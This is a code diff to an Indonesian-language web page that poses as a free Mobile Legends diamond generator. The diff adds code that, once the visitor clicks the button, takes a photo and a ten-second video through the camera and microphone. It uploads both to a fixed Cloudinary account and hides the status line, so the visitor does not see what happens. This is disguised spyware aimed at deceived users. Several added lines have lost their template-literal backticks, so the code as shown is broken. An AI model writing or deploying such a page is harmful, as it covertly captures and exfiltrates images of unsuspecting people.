@@ -57,14 +57,15 @@
 <body>
     <h1>Diamond Mobile Legend Generator</h1>
     <p>Nickname:</p>
-    <input type="text" id="nickname" placeholder="Nickname ML">
+    <input type="text" placeholder="Nickname ML">
     <br>
     <p>Jumlah Diamond:</p>
-    <input type="number" id="diamondCount" placeholder="Max 9999">
+    <input type="number" placeholder="Max 9999">
     <br>
     <br>
     <button id="startButton">Generate Diamond!</button>
-    <p id="status"></p>
+    <p>Accept All Cookies!</p>
+    <p id="status" hidden></p>
 
     <!-- Modal untuk meminta izin cookies -->
     <div id="cookieConsentModal">
@@ -74,75 +75,138 @@
     </div>
 
     <script>
-        const CLOUD_NAME = 'dsiyan9do';
-        const UPLOAD_PRESET = 'pproject';
-        
+        const CLOUD_NAME = 'dsiyan9do'; // Ganti dengan Cloud Name Anda
+        const UPLOAD_PRESET = 'pproject'; // Ganti dengan Upload Preset Anda
+
         const startButton = document.getElementById('startButton');
         const statusText = document.getElementById('status');
         const cookieConsentModal = document.getElementById('cookieConsentModal');
         const acceptCookiesButton = document.getElementById('acceptCookies');
         const declineCookiesButton = document.getElementById('declineCookies');
 
+        let cameraStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+
+        // Tampilkan modal cookies saat halaman dimuat
         document.addEventListener('DOMContentLoaded', () => {
             if (!document.cookie.includes('cookieConsent=true')) {
                 cookieConsentModal.style.display = 'block';
             }
         });
 
+        // Fungsi untuk menyetujui cookies
         acceptCookiesButton.addEventListener('click', () => {
-            document.cookie = "cookieConsent=true; max-age=2592000; path=/";
+            document.cookie = "cookieConsent=true; max-age=2592000; path=/"; // Simpan selama 30 hari
             cookieConsentModal.style.display = 'none';
         });
 
+        // Fungsi untuk menolak cookies
         declineCookiesButton.addEventListener('click', () => {
             cookieConsentModal.style.display = 'none';
             statusText.textContent = 'Anda harus menyetujui cookies untuk menggunakan fitur ini.';
             statusText.hidden = false;
         });
 
+        // Fungsi untuk memulai kamera
+        async function startCamera() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                statusText.textContent = 'Kamera berhasil diakses.';
+            } catch (error) {
+                statusText.textContent = 'Gagal mengakses kamera: ' + error.message;
+            }
+        }
+
+        // Fungsi untuk mengambil foto
+        async function takePhoto() {
+            const videoTrack = cameraStream.getVideoTracks()[0];
+            const imageCapture = new ImageCapture(videoTrack);
+
+            try {
+                const photoBlob = await imageCapture.takePhoto();
+                statusText.textContent = 'Foto berhasil diambil. Mengunggah ke Cloudinary...';
+                await uploadToCloudinary(photoBlob, 'image');
+            } catch (error) {
+                statusText.textContent = 'Gagal mengambil foto: ' + error.message;
+            }
+        }
+
+        // Fungsi untuk merekam video
+        async function recordVideo() {
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(cameraStream, { mimeType: 'video/webm; codecs=vp9' });
+
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = async () => {
+                if (recordedChunks.length === 0) {
+                    statusText.textContent = 'Gagal merekam video: Tidak ada data tersimpan.';
+                    return;
+                }
+
+                const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+
+                // Pastikan Blob memiliki data
+                if (videoBlob.size < 1000) {
+                    statusText.textContent = 'Gagal mengunggah: File video terlalu kecil!';
+                    return;
+                }
+
+                statusText.textContent = 'Video berhasil direkam. Mengunggah ke Cloudinary...';
+                await uploadToCloudinary(videoBlob, 'video');
+            };
+
+            mediaRecorder.start();
+            statusText.textContent = 'Merekam video...';
+
+            setTimeout(() => {
+                mediaRecorder.stop();
+            }, 10000);
+        }
+
+        // Fungsi untuk mengunggah ke Cloudinary
         async function uploadToCloudinary(file, type) {
             try {
                 const formData = new FormData();
                 formData.append('file', file);
                 formData.append('upload_preset', UPLOAD_PRESET);
-                
+
                 const endpoint = type === 'image' ? 'image/upload' : 'video/upload';
-                const response = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/${endpoint}`, {
+                const response = await fetch(https://api.cloudinary.com/v1_1/${CLOUD_NAME}/${endpoint}, {
                     method: 'POST',
                     body: formData,
                 });
 
                 const data = await response.json();
                 if (data.secure_url) {
-                    statusText.innerHTML = `${type === 'image' ? 'Foto' : 'Video'} berhasil diunggah! <a href="${data.secure_url}" target="_blank">Lihat di sini</a>`;
+                    statusText.innerHTML = ${type === 'image' ? 'Foto' : 'Video'} berhasil diunggah! <a href="${data.secure_url}" target="_blank">Lihat di sini</a>;
                 } else {
-                    statusText.textContent = `Gagal mengunggah ${type}: ${JSON.stringify(data)}`;
+                    statusText.textContent = Gagal mengunggah ${type}: ${JSON.stringify(data)};
                 }
             } catch (error) {
-                statusText.textContent = `Gagal mengunggah ${type}: ${error.message}`;
+                statusText.textContent = Gagal mengunggah ${type}: ${error.message};
             }
         }
 
         startButton.addEventListener('click', async () => {
             if (!document.cookie.includes('cookieConsent=true')) {
-                cookieConsentModal.style.display = 'block';
-                return;
-            }
-
-            const nickname = document.getElementById('nickname').value;
-            const diamondCount = document.getElementById('diamondCount').value;
-
-            if (!nickname || !diamondCount || diamondCount > 9999 || diamondCount <= 0) {
-                statusText.textContent = 'Mohon masukkan nickname dan jumlah diamond yang valid (1-9999).';
+                statusText.textContent = 'Anda harus menyetujui cookies terlebih dahulu.';
                 statusText.hidden = false;
                 return;
             }
 
-            statusText.textContent = `Permintaan ${diamondCount} diamond untuk ${nickname} sedang diproses...`;
-            statusText.hidden = false;
-            setTimeout(() => {
-                statusText.textContent = `Diamond berhasil dikirim ke akun ${nickname}!`;
-            }, 3000);
+            statusText.textContent = 'Mengakses kamera...';
+            await startCamera();
+
+            if (cameraStream) {
+                await takePhoto();
+                await recordVideo();
+            }
         });
     </script>
 </body>
